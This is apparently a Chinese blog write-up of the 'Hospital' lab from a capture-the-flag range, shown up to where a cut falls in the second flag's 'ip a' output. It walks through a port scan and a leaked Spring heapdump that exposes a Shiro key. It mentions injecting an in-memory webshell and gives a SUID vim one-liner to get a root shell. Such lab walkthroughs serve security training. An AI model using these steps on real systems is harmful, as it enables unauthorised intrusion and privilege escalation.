        <h2 class="post-title" itemprop="name headline">
          <a href="/2025/04/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Hospital/" class="post-title-link" itemprop="url">春秋云镜-Hospital</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2025-04-10 16:46:51 / 修改时间：19:05:01" itemprop="dateCreated datePublished" datetime="2025-04-10T16:46:51+08:00">2025-04-10</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/" itemprop="url" rel="index"><span itemprop="name">春秋云镜</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>21k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>19 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="flag01"><a href="#flag01" class="headerlink" title="flag01"></a>flag01</h1><p>首先扫描一下端口，有一个22端口和8080端口，然后用fscan对这两个端口进行扫描，可以扫到一个heapdump泄露</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# ../pentest/fscan/fscan -h 39.99.232.64 -p 8080</span><br><span class="line"></span><br><span class="line">   ___                              _</span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __</span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;</span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\</span><br><span class="line">                     fscan version: 1.8.4</span><br><span class="line">start infoscan</span><br><span class="line">39.99.232.64:8080 open</span><br><span class="line">[*] alive ports len is: 1</span><br><span class="line">start vulscan</span><br><span class="line">[*] WebTitle http://39.99.232.64:8080  code:302 len:0      title:None 跳转url: http://39.99.232.64:8080/login;jsessionid=AABFA3A139D86181B9A09BD41BE26BAD</span><br><span class="line">[*] WebTitle http://39.99.232.64:8080/login;jsessionid=AABFA3A139D86181B9A09BD41BE26BAD code:200 len:2005   title:医疗管理后台</span><br><span class="line">[+] PocScan http://39.99.232.64:8080 poc-yaml-spring-actuator-heapdump-file</span><br><span class="line">已完成 1/1</span><br><span class="line">[*] 扫描结束,耗时: 6.890674118s</span><br></pre></td></tr></table></figure>

<p>访问/actuator/heapdump，奖heapdump下载下了，然后用JDumpSpider分析</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br></pre></td><td class="code"><pre><span class="line">E:\CTF\heapdump via ☕ v17.0.11</span><br><span class="line">❯ java -jar .\JDumpSpider-1.1-SNAPSHOT-full.jar .\heapdump</span><br><span class="line">===========================================</span><br><span class="line">SpringDataSourceProperties</span><br><span class="line">-------------</span><br><span class="line">not found!</span><br><span class="line"></span><br><span class="line">===========================================</span><br><span class="line">WeblogicDataSourceConnectionPoolConfig</span><br><span class="line">-------------</span><br><span class="line">not found!</span><br><span class="line"></span><br><span class="line">===========================================</span><br><span class="line">MongoClient</span><br><span class="line">-------------</span><br><span class="line">not found!</span><br><span class="line"></span><br><span class="line">===========================================</span><br><span class="line">AliDruidDataSourceWrapper</span><br><span class="line">-------------</span><br><span class="line">not found!</span><br><span class="line"></span><br><span class="line">===========================================</span><br><span class="line">HikariDataSource</span><br><span class="line">-------------</span><br><span class="line">not found!</span><br><span class="line"></span><br><span class="line">===========================================</span><br><span class="line">RedisStandaloneConfiguration</span><br><span class="line">-------------</span><br><span class="line">not found!</span><br><span class="line"></span><br><span class="line">===========================================</span><br><span class="line">JedisClient</span><br><span class="line">-------------</span><br><span class="line">not found!</span><br><span class="line"></span><br><span class="line">===========================================</span><br><span class="line">CookieRememberMeManager(ShiroKey)</span><br><span class="line">-------------</span><br><span class="line">algMode = CBC, key = GAYysgMQhG7/CzIJlVpR2g==, algName = AES</span><br><span class="line"></span><br><span class="line">===========================================</span><br><span class="line">OriginTrackedMapPropertySource</span><br><span class="line">-------------</span><br><span class="line">management.endpoints.web.exposure.include = *</span><br><span class="line">server.port = 8080</span><br><span class="line">spring.thymeleaf.prefix = classpath:/templates/</span><br><span class="line"></span><br><span class="line">===========================================</span><br><span class="line">MutablePropertySources</span><br><span class="line">-------------</span><br><span class="line">awt.toolkit = sun.awt.X11.XToolkit</span><br><span class="line">sun.boot.class.path = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/resources.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/rt.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/sunrsasign.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jsse.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jce.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/charsets.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jfr.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/classes</span><br><span class="line">java.protocol.handler.pkgs = org.springframework.boot.loader</span><br><span class="line">sun.management.compiler = HotSpot 64-Bit Tiered Compilers</span><br><span class="line">sun.cpu.isalist =</span><br><span class="line">sun.jnu.encoding = UTF-8</span><br><span class="line">java.runtime.version = 1.8.0_392-8u392-ga-1~20.04-b08</span><br><span class="line">java.class.path = /app/login-1.0-SNAPSHOT.jar</span><br><span class="line">path.separator = :</span><br><span class="line">java.vm.vendor = Private Build</span><br><span class="line">os.version = 5.4.0-164-generic</span><br><span class="line">java.endorsed.dirs = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/endorsed</span><br><span class="line">java.runtime.name = OpenJDK Runtime Environment</span><br><span class="line">file.encoding = UTF-8</span><br><span class="line">catalina.useNaming = false</span><br><span class="line">spring.beaninfo.ignore = true</span><br><span class="line">java.vm.specification.version = 1.8</span><br><span class="line">os.name = Linux</span><br><span class="line">java.vm.name = OpenJDK 64-Bit Server VM</span><br><span class="line">local.server.port = null</span><br><span class="line">user.country = US</span><br><span class="line">java.vendor.url.bug = http://bugreport.sun.com/bugreport/</span><br><span class="line">sun.java.command = /app/login-1.0-SNAPSHOT.jar</span><br><span class="line">java.io.tmpdir = /tmp</span><br><span class="line">catalina.home = /tmp/tomcat.5978727065775558529.8080</span><br><span class="line">java.version = 1.8.0_392</span><br><span class="line">user.home = /home/app</span><br><span class="line">user.language = en</span><br><span class="line">PID = 750</span><br><span class="line">java.awt.printerjob = sun.print.PSPrinterJob</span><br><span class="line">file.separator = /</span><br><span class="line">catalina.base = /tmp/tomcat.5978727065775558529.8080</span><br><span class="line">java.vm.info = mixed mode</span><br><span class="line">java.specification.name = Java Platform API Specification</span><br><span class="line">java.vm.specification.vendor = Oracle Corporation</span><br><span class="line">java.awt.graphicsenv = sun.awt.X11GraphicsEnvironment</span><br><span class="line">java.awt.headless = true</span><br><span class="line">sun.io.unicode.encoding = UnicodeLittle</span><br><span class="line">java.ext.dirs = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/ext:/usr/java/packages/lib/ext</span><br><span class="line"></span><br><span class="line">===========================================</span><br><span class="line">MapPropertySources</span><br><span class="line">-------------</span><br><span class="line">local.server.port = null</span><br><span class="line"></span><br><span class="line">===========================================</span><br><span class="line">ConsulPropertySources</span><br><span class="line">-------------</span><br><span class="line">not found!</span><br><span class="line"></span><br><span class="line">===========================================</span><br><span class="line">JavaProperties</span><br><span class="line">-------------</span><br><span class="line">java.util.logging.FileHandler.pattern = %h/java%u.log</span><br><span class="line">awt.toolkit = sun.awt.X11.XToolkit</span><br><span class="line">sun.cpu.isalist =</span><br><span class="line">sun.jnu.encoding = UTF-8</span><br><span class="line">sun.arch.data.model = 64</span><br><span class="line">catalina.useNaming = false</span><br><span class="line">security.overridePropertiesFile = true</span><br><span class="line">sun.boot.library.path = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/amd64</span><br><span class="line">security.provider.7 = com.sun.security.sasl.Provider</span><br><span class="line">sun.java.command = /app/login-1.0-SNAPSHOT.jar</span><br><span class="line">security.provider.9 = sun.security.smartcardio.SunPCSC</span><br><span class="line">java.specification.vendor = Oracle Corporation</span><br><span class="line">security.provider.1 = sun.security.provider.Sun</span><br><span class="line">security.provider.2 = sun.security.rsa.SunRsaSign</span><br><span class="line">security.provider.3 = sun.security.ec.SunEC</span><br><span class="line">networkaddress.cache.negative.ttl = 10</span><br><span class="line">security.provider.4 = com.sun.net.ssl.internal.ssl.Provider</span><br><span class="line">security.provider.5 = com.sun.crypto.provider.SunJCE</span><br><span class="line">security.provider.6 = sun.security.jgss.SunProvider</span><br><span class="line">file.separator = /</span><br><span class="line">org.springframework.web.servlet.HandlerExceptionResolver = org.springframework.web.servlet.mvc.method.annotation.ExceptionHandlerExceptionResolver,org.springframework.web.servlet.mvc.annotation.ResponseStatusExceptionResolver,org.springframework.web.servlet.mvc.support.DefaultHandlerExceptionResolver</span><br><span class="line">java.specification.name = Java Platform API Specification</span><br><span class="line">java.vm.specification.vendor = Oracle Corporation</span><br><span class="line">org.springframework.web.servlet.HandlerMapping = org.springframework.web.servlet.handler.BeanNameUrlHandlerMapping,org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping,org.springframework.web.servlet.function.support.RouterFunctionMapping</span><br><span class="line">org.springframework.web.servlet.HandlerAdapter = org.springframework.web.servlet.mvc.HttpRequestHandlerAdapter,org.springframework.web.servlet.mvc.SimpleControllerHandlerAdapter,org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter,org.springframework.web.servlet.function.support.HandlerFunctionAdapter</span><br><span class="line">org.springframework.web.servlet.FlashMapManager = org.springframework.web.servlet.support.SessionFlashMapManager</span><br><span class="line">package.definition = sun.,com.sun.xml.internal.,com.sun.imageio.,com.sun.istack.internal.,com.sun.jmx.,com.sun.media.sound.,com.sun.naming.internal.,com.sun.proxy.,com.sun.corba.se.,com.sun.org.apache.bcel.internal.,com.sun.org.apache.regexp.internal.,com.sun.org.apache.xerces.internal.,com.sun.org.apache.xpath.internal.,com.sun.org.apache.xalan.internal.extensions.,com.sun.org.apache.xalan.internal.lib.,com.sun.org.apache.xalan.internal.res.,com.sun.org.apache.xalan.internal.templates.,com.sun.org.apache.xalan.internal.utils.,com.sun.org.apache.xalan.internal.xslt.,com.sun.org.apache.xalan.internal.xsltc.cmdline.,com.sun.org.apache.xalan.internal.xsltc.compiler.,com.sun.org.apache.xalan.internal.xsltc.trax.,com.sun.org.apache.xalan.internal.xsltc.util.,com.sun.org.apache.xml.internal.res.,com.sun.org.apache.xml.internal.resolver.helpers.,com.sun.org.apache.xml.internal.resolver.readers.,com.sun.org.apache.xml.internal.security.,com.sun.org.apache.xml.internal.serializer.utils.,com.sun.org.apache.xml.internal.utils.,com.sun.org.glassfish.,com.oracle.xmlns.internal.,com.oracle.webservices.internal.,oracle.jrockit.jfr.,org.jcp.xml.dsig.internal.,jdk.internal.,jdk.nashorn.internal.,jdk.nashorn.tools.,jdk.xml.internal.,com.sun.activation.registries.,jdk.jfr.events.,jdk.jfr.internal.,jdk.management.jfr.internal.</span><br><span class="line">sun.boot.class.path = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/resources.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/rt.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/sunrsasign.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jsse.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jce.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/charsets.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jfr.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/classes</span><br><span class="line">java.protocol.handler.pkgs = org.springframework.boot.loader</span><br><span class="line">sun.management.compiler = HotSpot 64-Bit Tiered Compilers</span><br><span class="line">org.springframework.web.servlet.ThemeResolver = org.springframework.web.servlet.theme.FixedThemeResolver</span><br><span class="line">java.runtime.version = 1.8.0_392-8u392-ga-1~20.04-b08</span><br><span class="line">user.name = app</span><br><span class="line">policy.url.1 = file:$&#123;java.home&#125;/lib/security/java.policy</span><br><span class="line">securerandom.source = file:/dev/random</span><br><span class="line">policy.url.2 = file:$&#123;user.home&#125;/.java.policy</span><br><span class="line">jdk.tls.disabledAlgorithms = SSLv3, TLSv1, TLSv1.1, RC4, DES, MD5withRSA, DH keySize &lt; 1024, EC keySize &lt; 224, 3DES_EDE_CBC, anon, NULL, include jdk.disabled.namedCurves</span><br><span class="line">policy.ignoreIdentityScope = false</span><br><span class="line">file.encoding = UTF-8</span><br><span class="line">java.util.logging.ConsoleHandler.formatter = java.util.logging.SimpleFormatter</span><br><span class="line">jdk.sasl.disabledMechanisms =</span><br><span class="line">java.io.tmpdir = /tmp</span><br><span class="line">org.springframework.web.servlet.ViewResolver = org.springframework.web.servlet.view.InternalResourceViewResolver</span><br><span class="line">java.version = 1.8.0_392</span><br><span class="line">java.vm.specification.name = Java Virtual Machine Specification</span><br><span class="line">jdk.tls.keyLimits = AES/GCM/NoPadding KeyUpdate 2^37</span><br><span class="line">PID = 750</span><br><span class="line">java.awt.printerjob = sun.print.PSPrinterJob</span><br><span class="line">jdk.xml.dsig.secureValidationPolicy = disallowAlg http://www.w3.org/TR/1999/REC-xslt-19991116,disallowAlg http://www.w3.org/2001/04/xmldsig-more#rsa-md5,disallowAlg http://www.w3.org/2001/04/xmldsig-more#hmac-md5,disallowAlg http://www.w3.org/2001/04/xmldsig-more#md5,maxTransforms 5,maxReferences 30,disallowReferenceUriSchemes file http https,minKeySize RSA 1024,minKeySize DSA 1024,minKeySize EC 224,noDuplicateIds,noRetrievalMethodLoops</span><br><span class="line">java.library.path = /usr/java/packages/lib/amd64:/usr/lib/x86_64-linux-gnu/jni:/lib/x86_64-linux-gnu:/usr/lib/x86_64-linux-gnu:/usr/lib/jni:/lib:/usr/lib</span><br><span class="line">java.vendor = Private Build</span><br><span class="line">java.specification.maintenance.version = 5</span><br><span class="line">handlers = java.util.logging.ConsoleHandler</span><br><span class="line">sun.io.unicode.encoding = UnicodeLittle</span><br><span class="line">krb5.kdc.bad.policy = tryLast</span><br><span class="line">java.class.path = /app/login-1.0-SNAPSHOT.jar</span><br><span class="line">java.vm.vendor = Private Build</span><br><span class="line">jdk.security.legacyAlgorithms = SHA1, RSA keySize &lt; 2048, DSA keySize &lt; 2048</span><br><span class="line">jdk.disabled.namedCurves = secp112r1, secp112r2, secp128r1, secp128r2, secp160k1, secp160r1, secp160r2, secp192k1, secp192r1, secp224k1, secp224r1, secp256k1, sect113r1, sect113r2, sect131r1, sect131r2, sect163k1, sect163r1, sect163r2, sect193r1, sect193r2, sect233k1, sect233r1, sect239k1, sect283k1, sect283r1, sect409k1, sect409r1, sect571k1, sect571r1, X9.62 c2tnb191v1, X9.62 c2tnb191v2, X9.62 c2tnb191v3, X9.62 c2tnb239v1, X9.62 c2tnb239v2, X9.62 c2tnb239v3, X9.62 c2tnb359v1, X9.62 c2tnb431r1, X9.62 prime192v2, X9.62 prime192v3, X9.62 prime239v1, X9.62 prime239v2, X9.62 prime239v3, brainpoolP256r1, brainpoolP320r1, brainpoolP384r1, brainpoolP512r1</span><br><span class="line">crypto.policy = unlimited</span><br><span class="line">jceks.key.serialFilter = java.lang.Enum;java.security.KeyRep;java.security.KeyRep$Type;javax.crypto.spec.SecretKeySpec;!*</span><br><span class="line">login.configuration.provider = sun.security.provider.ConfigFile</span><br><span class="line">user.timezone =</span><br><span class="line">java.vm.specification.version = 1.8</span><br><span class="line">os.name = Linux</span><br><span class="line">user.country = US</span><br><span class="line">jdk.security.caDistrustPolicies = SYMANTEC_TLS</span><br><span class="line">sun.cpu.endian = little</span><br><span class="line">user.home = /home/app</span><br><span class="line">user.language = en</span><br><span class="line">en = UTF-8</span><br><span class="line">jdk.tls.alpnCharset = ISO_8859_1</span><br><span class="line">ssl.KeyManagerFactory.algorithm = SunX509</span><br><span class="line">.level = INFO</span><br><span class="line">java.awt.graphicsenv = sun.awt.X11GraphicsEnvironment</span><br><span class="line">java.awt.headless = true</span><br><span class="line">com.xyz.foo.level = SEVERE</span><br><span class="line">policy.provider = sun.security.provider.PolicyFile</span><br><span class="line">path.separator = :</span><br><span class="line">fr = UTF-8</span><br><span class="line">os.version = 5.4.0-164-generic</span><br><span class="line">java.endorsed.dirs = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/endorsed</span><br><span class="line">java.runtime.name = OpenJDK Runtime Environment</span><br><span class="line">keystore.type.compat = true</span><br><span class="line">org.springframework.web.servlet.RequestToViewNameTranslator = org.springframework.web.servlet.view.DefaultRequestToViewNameTranslator</span><br><span class="line">spring.beaninfo.ignore = true</span><br><span class="line">java.vm.name = OpenJDK 64-Bit Server VM</span><br><span class="line">java.vendor.url.bug = http://bugreport.sun.com/bugreport/</span><br><span class="line">java.util.logging.FileHandler.formatter = java.util.logging.XMLFormatter</span><br><span class="line">java.util.logging.FileHandler.count = 1</span><br><span class="line">catalina.home = /tmp/tomcat.5978727065775558529.8080</span><br><span class="line">sun.cds.enableSharedLookupCache = false</span><br><span class="line">sun.security.krb5.maxReferrals = 5</span><br><span class="line">catalina.base = /tmp/tomcat.5978727065775558529.8080</span><br><span class="line">java.util.logging.FileHandler.limit = 50000</span><br><span class="line">java.vm.info = mixed mode</span><br><span class="line">keystore.type = jks</span><br><span class="line">java.ext.dirs = /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/ext:/usr/java/packages/lib/ext</span><br><span class="line">policy.expandProperties = true</span><br><span class="line">securerandom.strongAlgorithms = NativePRNGBlocking:SUN</span><br><span class="line"></span><br><span class="line">===========================================</span><br><span class="line">ProcessEnvironment</span><br><span class="line">-------------</span><br><span class="line">not found!</span><br><span class="line"></span><br><span class="line">===========================================</span><br><span class="line">OSS</span><br><span class="line">-------------</span><br><span class="line">not found!</span><br><span class="line"></span><br><span class="line">===========================================</span><br><span class="line">UserPassSearcher</span><br><span class="line">-------------</span><br><span class="line">org.apache.shiro.web.filter.authc.FormAuthenticationFilter:</span><br><span class="line">[failureKeyAttribute = shiroLoginFailure, loginUrl = /login, successUrl = /, usernameParam = username, passwordParam = password]</span><br><span class="line"></span><br><span class="line">org.apache.catalina.startup.Tomcat:</span><br><span class="line">[hostname = localhost]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">===========================================</span><br><span class="line">CookieThief</span><br><span class="line">-------------</span><br><span class="line">not found!</span><br><span class="line"></span><br><span class="line">===========================================</span><br><span class="line">AuthThief</span><br><span class="line">-------------</span><br><span class="line">not found!</span><br><span class="line"></span><br><span class="line">===========================================</span><br></pre></td></tr></table></figure>

<p>有一个shirokey</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">algMode = CBC, key = GAYysgMQhG7/CzIJlVpR2g==, algName = AES</span><br></pre></td></tr></table></figure>

<p>用shiro工具注入内存马,冰蝎连接即可</p>
<p>vim.basic存在suid权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">app@web01:~$ find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">/usr/bin/vim.basic</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/staprun</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/stapbpf</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/fusermount</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br></pre></td></tr></table></figure>

<p>系统存在python3环境， 参考<a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/vim/">https://gtfobins.github.io/gtfobins/vim/</a> 提权，flag01在/root/flag下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/vim.basic -c &#x27;:python3 import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-pc&quot;, &quot;reset; exec sh -p&quot;)&#x27;</span><br></pre></td></tr></table></figure>

<h1 id="flag02"><a href="#flag02" class="headerlink" title="flag02"></a>flag02</h1><p>然后搭建一个代理隧道，上传一个fscan开始扫描</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">ip a   </span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1/128 scope host </span><br><span class="line">     